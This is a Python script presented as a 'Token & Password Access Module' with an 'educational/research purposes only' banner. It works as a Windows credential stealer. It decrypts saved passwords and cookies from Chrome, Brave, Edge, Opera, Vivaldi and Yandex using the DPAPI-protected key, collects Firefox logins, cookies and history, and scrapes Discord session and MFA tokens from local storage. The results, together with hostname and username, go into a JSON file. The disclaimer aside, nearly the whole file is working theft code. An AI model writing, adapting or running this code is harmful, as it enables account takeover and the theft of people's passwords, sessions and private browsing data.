"""
Token and Password Extraction Module for Windows
- Extracts saved credentials from multiple browsers:
  Chrome, Brave, Firefox, Opera, Microsoft Edge, Vivaldi, etc.
- Retrieves tokens, cookies, and login data
- Saves extracted data to local JSON file

WARNING: This is for EDUCATIONAL/RESEARCH purposes only.
Unauthorized access to computer systems is illegal.
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import platform
from datetime import datetime, timedelta
from pathlib import Path

# Output directory for extracted data
OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "extracted_data")

# Browser paths configuration for Windows
# Format: (browser_name, local_state_path, login_data_path, cookies_path, history_path)
CHROMIUM_BROWSERS = {
    "Chrome": {
        "local_state": os.path.join("Google", "Chrome", "User Data", "Local State"),
        "login_data": os.path.join("Google", "Chrome", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Google", "Chrome", "User Data", "Default", "Cookies"),
        "history": os.path.join("Google", "Chrome", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Brave": {
        "local_state": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Local State"),
        "login_data": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Cookies"),
        "history": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Edge": {
        "local_state": os.path.join("Microsoft", "Edge", "User Data", "Local State"),
        "login_data": os.path.join("Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Microsoft", "Edge", "User Data", "Default", "Cookies"),
        "history": os.path.join("Microsoft", "Edge", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Opera": {
        "local_state": os.path.join("Opera Software", "Opera Stable", "Local State"),
        "login_data": os.path.join("Opera Software", "Opera Stable", "Login Data"),
        "cookies": os.path.join("Opera Software", "Opera Stable", "Network", "Cookies"),
        "cookies_alt": os.path.join("Opera Software", "Opera Stable", "Cookies"),
        "history": os.path.join("Opera Software", "Opera Stable", "History"),
        "base_path": "Roaming"
    },
    "Opera GX": {
        "local_state": os.path.join("Opera Software", "Opera GX Stable", "Local State"),
        "login_data": os.path.join("Opera Software", "Opera GX Stable", "Login Data"),
        "cookies": os.path.join("Opera Software", "Opera GX Stable", "Network", "Cookies"),
        "cookies_alt": os.path.join("Opera Software", "Opera GX Stable", "Cookies"),
        "history": os.path.join("Opera Software", "Opera GX Stable", "History"),
        "base_path": "Roaming"
    },
    "Vivaldi": {
        "local_state": os.path.join("Vivaldi", "User Data", "Local State"),
        "login_data": os.path.join("Vivaldi", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Vivaldi", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Vivaldi", "User Data", "Default", "Cookies"),
        "history": os.path.join("Vivaldi", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Chromium": {
        "local_state": os.path.join("Chromium", "User Data", "Local State"),
        "login_data": os.path.join("Chromium", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Chromium", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Chromium", "User Data", "Default", "Cookies"),
        "history": os.path.join("Chromium", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Yandex": {
        "local_state": os.path.join("Yandex", "YandexBrowser", "User Data", "Local State"),
        "login_data": os.path.join("Yandex", "YandexBrowser", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Yandex", "YandexBrowser", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Yandex", "YandexBrowser", "User Data", "Default", "Cookies"),
        "history": os.path.join("Yandex", "YandexBrowser", "User Data", "Default", "History"),
        "base_path": "Local"
    },
}

# Firefox profile paths
FIREFOX_PATHS = {
    "Firefox": os.path.join("Mozilla", "Firefox", "Profiles"),
    "Firefox Developer": os.path.join("Mozilla", "Firefox Developer Edition", "Profiles"),
    "Waterfox": os.path.join("Waterfox", "Profiles"),
    "Pale Moon": os.path.join("Moonchild Productions", "Pale Moon", "Profiles"),
}


def get_system_info():
    """Get basic system information"""
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.architecture()[0],
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "timestamp": datetime.now().isoformat()
    }


def get_appdata_path(base_type="Local"):
    """Get AppData path based on type (Local or Roaming)"""
    if platform.system() != "Windows":
        return None
    
    if base_type == "Local":
        return os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local")
    else:
        return os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Roaming")


def get_encryption_key(local_state_path):
    """
    Get the AES encryption key used by Chromium browsers to encrypt passwords
    This key is stored in Local State file and encrypted with Windows DPAPI
    """
    try:
        if platform.system() != "Windows":
            return None
            
        if not os.path.exists(local_state_path):
            return None
        
        import win32crypt
        
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
            
        # Get the encrypted key
        encrypted_key = base64.b64decode(
            local_state["os_crypt"]["encrypted_key"]
        )
        
        # Remove DPAPI prefix (first 5 bytes = "DPAPI")
        encrypted_key = encrypted_key[5:]
        
        # Decrypt using Windows DPAPI
        decrypted_key = win32crypt.CryptUnprotectData(
            encrypted_key, None, None, None, 0
        )[1]
        
        return decrypted_key
        
    except Exception as e:
        print(f"    [!] Error getting encryption key: {e}")
        return None


def decrypt_password(encrypted_password, key):
    """
    Decrypt Chromium browser password using AES-GCM
    """
    try:
        if platform.system() != "Windows":
            return None
        
        if not encrypted_password:
            return None
            
        # Check if it's v10/v11 encryption (AES-GCM)
        if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
            if not key:
                return "[no_key]"
                
            from Crypto.Cipher import AES
            
            # Get initialization vector (12 bytes after version prefix)
            iv = encrypted_password[3:15]
            
            # Get encrypted password (everything after IV, minus 16 byte auth tag)
            payload = encrypted_password[15:]
            
            # Decrypt using AES-GCM
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)
            
            # Remove authentication tag (last 16 bytes)
            decrypted_password = decrypted_password[:-16].decode('utf-8', errors='ignore')
            
            return decrypted_password
        else:
            # Old DPAPI method
            import win32crypt
            decrypted = win32crypt.CryptUnprotectData(
                encrypted_password, None, None, None, 0
            )[1]
            return decrypted.decode('utf-8', errors='ignore')
            
    except Exception as e:
        return "[decryption_failed]"


def get_chromium_passwords(browser_name, browser_config):
    """
    Extract saved passwords from Chromium-based browsers
    """
    passwords = []
    
    try:
        if platform.system() != "Windows":
            return passwords
        
        # Get base path
        base_path = get_appdata_path(browser_config["base_path"])
        if not base_path:
            return passwords
            
        # Get login data path
        login_data_path = os.path.join(base_path, browser_config["login_data"])
        
        if not os.path.exists(login_data_path):
            print(f"    [!] {browser_name} Login Data not found")
            return passwords
            
        # Get encryption key
        local_state_path = os.path.join(base_path, browser_config["local_state"])
        key = get_encryption_key(local_state_path)
        
        # Copy database to temp location (browser locks the file)
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_login_data.db")
        shutil.copy2(login_data_path, temp_db)
        
        # Connect to database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query saved passwords
        cursor.execute("""
            SELECT origin_url, action_url, username_value, password_value, 
                   date_created, date_last_used
            FROM logins
            ORDER BY date_last_used DESC
        """)
        
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            encrypted_password = row[3]
            date_created = row[4]
            date_last_used = row[5]
            
            # Decrypt password
            password = decrypt_password(encrypted_password, key)
            
            if username or password:
                passwords.append({
                    "browser": browser_name,
                    "origin_url": origin_url,
                    "action_url": action_url,
                    "username": username,
                    "password": password if password else "[empty]",
                    "date_created": str(date_created),
                    "date_last_used": str(date_last_used)
                })
        
        cursor.close()
        conn.close()
        
        # Clean up temp file
        try:
            os.remove(temp_db)
        except:
            pass
        
        print(f"    [+] Extracted {len(passwords)} passwords from {browser_name}")
        
    except Exception as e:
        print(f"    [!] Error extracting {browser_name} passwords: {e}")
        
    return passwords


def get_chromium_cookies(browser_name, browser_config):
    """
    Extract cookies from Chromium-based browsers
    """
    cookies = []
    
    try:
        if platform.system() != "Windows":
            return cookies
        
        # Get base path
        base_path = get_appdata_path(browser_config["base_path"])
        if not base_path:
            return cookies
            
        # Get cookies path (try new location first, then fallback)
        cookie_path = os.path.join(base_path, browser_config["cookies"])
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(base_path, browser_config["cookies_alt"])
        
        if not os.path.exists(cookie_path):
            print(f"    [!] {browser_name} Cookies not found")
            return cookies
            
        # Get encryption key
        local_state_path = os.path.join(base_path, browser_config["local_state"])
        key = get_encryption_key(local_state_path)
        
        # Copy database to temp location
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_cookies.db")
        shutil.copy2(cookie_path, temp_db)
        
        # Connect to database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query cookies
        cursor.execute("""
            SELECT host_key, name, encrypted_value, path, 
                   expires_utc, is_secure, is_httponly
            FROM cookies
            ORDER BY host_key
        """)
        
        for row in cursor.fetchall():
            host = row[0]
            name = row[1]
            encrypted_value = row[2]
            path = row[3]
            expires = row[4]
            is_secure = row[5]
            is_httponly = row[6]
            
            # Decrypt cookie value
            value = decrypt_password(encrypted_value, key)
            
            cookies.append({
                "browser": browser_name,
                "host": host,
                "name": name,
                "value": value if value else "[encrypted]",
                "path": path,
                "expires": str(expires),
                "is_secure": bool(is_secure),
                "is_httponly": bool(is_httponly)
            })
        
        cursor.close()
        conn.close()
        
        try:
            os.remove(temp_db)
        except:
            pass
        
        print(f"    [+] Extracted {len(cookies)} cookies from {browser_name}")
        
    except Exception as e:
        print(f"    [!] Error extracting {browser_name} cookies: {e}")
        
    return cookies


def get_chromium_history(browser_name, browser_config):
    """
    Extract browser history from Chromium-based browsers
    """
    history = []
    
    try:
        if platform.system() != "Windows":
            return history
        
        # Get base path
        base_path = get_appdata_path(browser_config["base_path"])
        if not base_path:
            return history
            
        # Get history path
        history_path = os.path.join(base_path, browser_config["history"])
        
        if not os.path.exists(history_path):
            print(f"    [!] {browser_name} History not found")
            return history
            
        # Copy database to temp location
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_history.db")
        shutil.copy2(history_path, temp_db)
        
        # Connect to database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query recent history
        cursor.execute("""
            SELECT url, title, visit_count, last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            LIMIT 200
        """)
        
        for row in cursor.fetchall():
            history.append({
                "browser": browser_name,
                "url": row[0],
                "title": row[1],
                "visit_count": row[2],
                "last_visit": str(row[3])
            })
        
        cursor.close()
        conn.close()
        
        try:
            os.remove(temp_db)
        except:
            pass
        
        print(f"    [+] Extracted {len(history)} history entries from {browser_name}")
        
    except Exception as e:
        print(f"    [!] Error extracting {browser_name} history: {e}")
        
    return history


def get_firefox_profiles():
    """
    Get all Firefox profile directories
    """
    profiles = []
    
    try:
        if platform.system() != "Windows":
            return profiles
            
        roaming = get_appdata_path("Roaming")
        
        for browser_name, profile_path in FIREFOX_PATHS.items():
            full_path = os.path.join(roaming, profile_path)
            
            if os.path.exists(full_path):
                for profile_dir in os.listdir(full_path):
                    profile_full_path = os.path.join(full_path, profile_dir)
                    if os.path.isdir(profile_full_path):
                        profiles.append({
                            "browser": browser_name,
                            "profile": profile_dir,
                            "path": profile_full_path
                        })
                        
    except Exception as e:
        print(f"    [!] Error getting Firefox profiles: {e}")
        
    return profiles


def get_firefox_passwords(profile_info):
    """
    Extract saved passwords from Firefox/Gecko browsers
    Note: Firefox uses NSS for encryption, which is more complex
    This extracts the encrypted data - full decryption requires NSS libraries
    """
    passwords = []
    
    try:
        logins_path = os.path.join(profile_info["path"], "logins.json")
        
        if not os.path.exists(logins_path):
            return passwords
            
        with open(logins_path, "r", encoding="utf-8") as f:
            logins_data = json.load(f)
            
        for login in logins_data.get("logins", []):
            passwords.append({
                "browser": profile_info["browser"],
                "profile": profile_info["profile"],
                "hostname": login.get("hostname", ""),
                "username": login.get("encryptedUsername", "[encrypted]"),
                "password": login.get("encryptedPassword", "[encrypted]"),
                "form_submit_url": login.get("formSubmitURL", ""),
                "time_created": login.get("timeCreated", ""),
                "time_last_used": login.get("timeLastUsed", ""),
                "time_password_changed": login.get("timePasswordChanged", ""),
                "note": "Firefox passwords are encrypted with NSS - requires key4.db for decryption"
            })
            
        print(f"    [+] Found {len(passwords)} passwords from {profile_info['browser']} ({profile_info['profile']})")
        
    except Exception as e:
        print(f"    [!] Error extracting Firefox passwords: {e}")
        
    return passwords


def get_firefox_cookies(profile_info):
    """
    Extract cookies from Firefox/Gecko browsers
    """
    cookies = []
    
    try:
        cookies_path = os.path.join(profile_info["path"], "cookies.sqlite")
        
        if not os.path.exists(cookies_path):
            return cookies
            
        # Copy database
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"firefox_cookies_{profile_info['profile']}.db")
        shutil.copy2(cookies_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT host, name, value, path, expiry, isSecure, isHttpOnly
            FROM moz_cookies
            ORDER BY host
        """)
        
        for row in cursor.fetchall():
            cookies.append({
                "browser": profile_info["browser"],
                "profile": profile_info["profile"],
                "host": row[0],
                "name": row[1],
                "value": row[2],
                "path": row[3],
                "expires": str(row[4]),
                "is_secure": bool(row[5]),
                "is_httponly": bool(row[6])
            })
        
        cursor.close()
        conn.close()
        
        try:
            os.remove(temp_db)
        except:
            pass
        
        print(f"    [+] Extracted {len(cookies)} cookies from {profile_info['browser']} ({profile_info['profile']})")
        
    except Exception as e:
        print(f"    [!] Error extracting Firefox cookies: {e}")
        
    return cookies


def get_firefox_history(profile_info):
    """
    Extract browser history from Firefox/Gecko browsers
    """
    history = []
    
    try:
        places_path = os.path.join(profile_info["path"], "places.sqlite")
        
        if not os.path.exists(places_path):
            return history
            
        # Copy database
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"firefox_history_{profile_info['profile']}.db")
        shutil.copy2(places_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT url, title, visit_count, last_visit_date
            FROM moz_places
            WHERE visit_count > 0
            ORDER BY last_visit_date DESC
            LIMIT 200
        """)
        
        for row in cursor.fetchall():
            history.append({
                "browser": profile_info["browser"],
                "profile": profile_info["profile"],
                "url": row[0],
                "title": row[1],
                "visit_count": row[2],
                "last_visit": str(row[3])
            })
        
        cursor.close()
        conn.close()
        
        try:
            os.remove(temp_db)
        except:
            pass
        
        print(f"    [+] Extracted {len(history)} history entries from {profile_info['browser']} ({profile_info['profile']})")
        
    except Exception as e:
        print(f"    [!] Error extracting Firefox history: {e}")
        
    return history


def get_discord_tokens():
    """
    Extract Discord tokens from local storage
    """
    tokens = []
    
    try:
        if platform.system() != "Windows":
            return tokens
            
        import re
        
        userprofile = os.environ.get("USERPROFILE", "")
        
        # Discord and browser token paths
        discord_paths = [
            os.path.join(userprofile, "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Roaming", "discordptb", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Roaming", "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Local", "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),
        ]
        
        # Token regex patterns
        token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
        mfa_pattern = r'mfa\.[\w-]{84}'
        
        for path in discord_paths:
            if not os.path.exists(path):
                continue
                
            for filename in os.listdir(path):
                if not filename.endswith(('.log', '.ldb')):
                    continue
                    
                filepath = os.path.join(path, filename)
                
                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                        
                    # Find tokens
                    for token in re.findall(token_pattern, content):
                        if token not in [t["token"] for t in tokens]:
                            tokens.append({
                                "type": "discord_token",
                                "token": token,
                                "source": path
                            })
                            
                    # Find MFA tokens
                    for token in re.findall(mfa_pattern, content):
                        if token not in [t["token"] for t in tokens]:
                            tokens.append({
                                "type": "discord_mfa_token",
                                "token": token,
                                "source": path
                            })
                            
                except Exception:
                    continue
        
        print(f"    [+] Found {len(tokens)} Discord tokens")
        
    except Exception as e:
        print(f"    [!] Error extracting Discord tokens: {e}")
        
    return tokens


def save_to_json(data, filename="browser_data.json"):
    """
    Save extracted data to local JSON file
    """
    try:
        # Create output directory if it doesn't exist
        if not os.path.exists(OUTPUT_DIR):
            os.makedirs(OUTPUT_DIR)
            
        # Generate filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = os.path.join(OUTPUT_DIR, f"extracted_{timestamp}.json")
        
        # Save data
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            
        print(f"\n[+] Data saved to: {output_file}")
        return output_file
        
    except Exception as e:
        print(f"[!] Error saving data: {e}")
        return None


def collect_all_data():
    """
    Collect all browser data and tokens from all installed browsers
    """
    print("\n" + "="*70)
    print("  Multi-Browser Data Extraction Tool")
    print("  Supports: Chrome, Brave, Firefox, Opera, Edge, Vivaldi, and more")
    print("="*70 + "\n")
    
    # Get system info
    system_info = get_system_info()
    print(f"[*] System: {system_info['hostname']} ({system_info['os']})")
    print(f"[*] User: {system_info['username']}")
    print(f"[*] Time: {system_info['timestamp']}\n")
    
    # Initialize data containers
    all_passwords = []
    all_cookies = []
    all_history = []
    all_tokens = []
    
    # ========== CHROMIUM-BASED BROWSERS ==========
    print("[*] Extracting from Chromium-based browsers...")
    print("-" * 50)
    
    for browser_name, browser_config in CHROMIUM_BROWSERS.items():
        print(f"\n  [{browser_name}]")
        
        # Passwords
        passwords = get_chromium_passwords(browser_name, browser_config)
        all_passwords.extend(passwords)
        
        # Cookies
        cookies = get_chromium_cookies(browser_name, browser_config)
        all_cookies.extend(cookies)
        
        # History
        history = get_chromium_history(browser_name, browser_config)
        all_history.extend(history)
    
    # ========== FIREFOX/GECKO BROWSERS ==========
    print("\n\n[*] Extracting from Firefox/Gecko browsers...")
    print("-" * 50)
    
    firefox_profiles = get_firefox_profiles()
    
    for profile in firefox_profiles:
        print(f"\n  [{profile['browser']} - {profile['profile']}]")
        
        # Passwords
        passwords = get_firefox_passwords(profile)
        all_passwords.extend(passwords)
        
        # Cookies
        cookies = get_firefox_cookies(profile)
        all_cookies.extend(cookies)
        
        # History
        history = get_firefox_history(profile)
        all_history.extend(history)
    
    # ========== DISCORD TOKENS ==========
    print("\n\n[*] Extracting Discord tokens...")
    print("-" * 50)
    tokens = get_discord_tokens()
    all_tokens.extend(tokens)
    
    # Compile all data
    collected_data = {
        "system_info": system_info,
        "passwords": {
            "data": all_passwords,
            "total_count": len(all_passwords)
        },
        "cookies": {
            "data": all_cookies[:500],  # Limit cookies
            "total_count": len(all_cookies)
        },
        "history": {
            "data": all_history[:500],  # Limit history
            "total_count": len(all_history)
        },
        "tokens": {
            "data": all_tokens,
            "total_count": len(all_tokens)
        },
        "extraction_timestamp": datetime.now().isoformat()
    }
    
    # Summary
    print("\n\n" + "="*70)
    print("  EXTRACTION SUMMARY")
    print("="*70)
    print(f"  Total Passwords: {collected_data['passwords']['total_count']}")
    print(f"  Total Cookies:   {collected_data['cookies']['total_count']}")
    print(f"  Total History:   {collected_data['history']['total_count']}")
    print(f"  Total Tokens:    {collected_data['tokens']['total_count']}")
    print("="*70)
    
    return collected_data


def main():
    """
    Main function - collect and save data locally
    """
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║           Token & Password Access Module v2.0                     ║
    ║                Multi-Browser Extraction Tool                      ║
    ║                                                                   ║
    ║  Supported Browsers:                                              ║
    ║  • Chromium: Chrome, Brave, Edge, Opera, Vivaldi, Yandex          ║
    ║  • Gecko: Firefox, Waterfox, Pale Moon                            ║
    ║                                                                   ║
    ║  [!] For Educational/Research Purposes Only                       ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    # Check if running on Windows
    if platform.system() != "Windows":
        print("[!] Warning: This script is designed for Windows OS")
        print("[!] Some features may not work on other platforms")
        print()
    
    # Collect all browser data
    collected_data = collect_all_data()
    
    # Save to local JSON file
    print("\n[*] Saving extracted data to local JSON file...")
    output_file = save_to_json(collected_data)
    
    if output_file:
        print(f"\n[+] Extraction completed successfully!")
        print(f"[+] Output file: {output_file}")
    else:
        print("\n[!] Failed to save data!")
    
    return collected_data


if __name__ == "__main__":
    main()
